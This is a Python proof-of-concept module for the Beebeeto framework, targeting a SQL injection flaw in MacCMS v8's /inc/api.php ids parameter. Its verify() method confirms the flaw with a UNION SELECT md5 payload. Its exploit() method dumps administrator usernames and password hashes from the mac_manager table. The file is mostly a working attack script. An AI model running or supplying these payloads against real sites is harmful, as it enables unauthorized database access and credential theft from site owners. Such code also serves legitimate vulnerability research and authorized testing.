#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0011',  # 由Beebeeto官方编辑
            'name': 'MacCMS v8 /inc/api.php SQL注入漏洞 POC',  # 名称
            'author': 'foundu',  # 作者
            'create_date': '2014-09-20',  # 编写日期
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',  # 该漏洞所涉及的协议名称
            'port': [80],  # 该协议常用的端口号，需为int类型
            'layer4_protocol': ['tcp'],  # 该协议
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'MacCMS',  # 漏洞所涉及的应用名称
            'vul_version': ['v8'],  # 受漏洞影响的应用版本
            'type': 'SQL Injection',  # 漏洞类型
            'tag': ['MacCMS', 'SQL Injection', '/inc/api.php'],  # 漏洞相关tag
            'desc': 'MacCMS V8版本中inc/ajax.php文件ids参数未经过过滤带入SQL语句，导致SQL注入漏洞的发生。',  # 漏洞描述
            'references': ['http://wooyun.org/bugs/wooyun-2014-066130',  # 参考链接
            ],
        },
    }

    @classmethod
    def verify(cls, args):
        vul_url = '%s/inc/api.php?ac=videolist&t=0&pg=0&ids=1' % args['options']['target']
        payload = '%29%20Union%20sElect/**/md5(602589),' + 'NULL,' * 48 + 'NULL%23'
        content = urllib2.urlopen(vul_url + payload).read()
        if args['options']['verbose']:
            print '[*] Request URL: ' + vul_url + payload
        if '243d353b44e167073a40f8bf33a02adb' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = vul_url
            return args
        else:
            args['success'] = False
            return args

    @classmethod
    def exploit(cls, args):
        vul_url = '%s/inc/api.php?ac=videolist&t=0&pg=0&ids=1' % args['options']['target']
        payload = '%29%20Union%20sElect/**/concat(m_name,0x3a3a,m_password),' + \
                      'NULL,' * 48 + 'NULL%20from%20mac_manager%23'
        match_data = re.compile('([\d\w]+)::([\w\d]{32})')
        if args['options']['verbose']:
            print '[*] Request URL: ' + vul_url + payload
        response = urllib2.urlopen(vul_url + payload).read()
        res = match_data.findall(response)
        if res:
            args['success'] = True
            args['poc_ret']['Admin-username'] = res[0][0]
            args['poc_ret']['Admin-password'] = res[0][1]
            return args
        else:
            args['success'] = False
            return args

if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())
